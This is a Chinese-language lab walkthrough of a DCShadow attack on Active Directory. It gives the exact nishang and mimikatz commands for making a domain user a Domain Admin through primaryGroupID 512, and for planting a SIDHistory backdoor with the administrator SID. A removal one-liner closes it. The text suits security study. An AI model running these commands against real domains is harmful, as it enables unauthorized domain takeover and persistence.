	http://192.168.0.107/ps/nishang/ActiveDirectory/Set-DCShadowPermissions.ps1
	DCShadow攻击是通过更改AD架构，使域内一台机器伪造成域控。
	此脚本可以通过修改AD对象提供DCShadow攻击的最小权限。
	运行此脚本需要DA(Domain Administrator)权限，可以使指定用户不需要DA权限使用mimikatz。
	域控：dc.zone.com
	域内机器：sub2k8.zone.com
	域内普通用户:y
	域控执行
	>Set-DCShadowPermissions -Fakedc sub2k8 -Object dc -username y –Verbose
	注册sub2k8为假DC，给予用户y从sub2k8修改dc的计算机对象的权限。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/482.png)

	在sub2k8上，以本地system权限启动一个mimikatz会话，以zone\y权限启动一个mimikatz会话。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/483.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/484.png)

	System权限窗口执行dcshadow攻击，修改dc的计算机属性
	Zone\y权限窗口用于推送
	添加域管理
	通过修改安全标识符，将域内普通用户y提升为域管理用户
	>lsadump::dcshadow /object:y /attribute:primaryGroupID /value:512
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/485.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/486.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/487.png)

	Zone\y推送
	>lsadump::dcshadow /push
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/488.png)

	此时在域控上查询可见y用户已经加入域管理组。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/489.png)

	添加SIDHistory后门
	记录域管理SID
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/490.png)

	>Set-DCShadowPermissions -FakeDC sub2k8 -Object y -Username y -Verbose
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/491.png)
	
	>lsadump::dcshadow /object:y /attribute:sidhistory /value:S-1-5-21-2346829310-1781191092-2540298887-500
	推送
	>lsadump::dcshadow /push
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/492.png)

	测试
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/493.png)

	域控中通过mimikatz命令可查询到SIDHistory
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/494.png)

	删除SIDHistory的方法
	PS>Get-ADUser -Filter {name -eq "y"} –Properties sidhistory|foreach {Set-ADuser $_ –remove @{sidhistory="S-1-5-21-2346829310-1781191092-2540298887-500"}}
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/495.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/496.png)

	删除功能规则
	输入的规则后面加参数-remove即可。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/497.png)